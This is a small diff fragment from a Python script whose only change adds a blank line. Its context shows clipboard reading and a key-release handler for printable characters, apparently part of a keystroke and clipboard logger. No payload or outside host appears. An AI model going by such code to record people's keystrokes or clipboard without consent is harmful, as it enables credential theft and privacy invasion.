@@ -29,6 +29,7 @@ def get_clipboard():
     except TypeError:
         clipboard = "Non Text Content Detected"
 
+
 def release(key):
     if hasattr(key, "char") and key is not None:
         if key.char.isprintable():
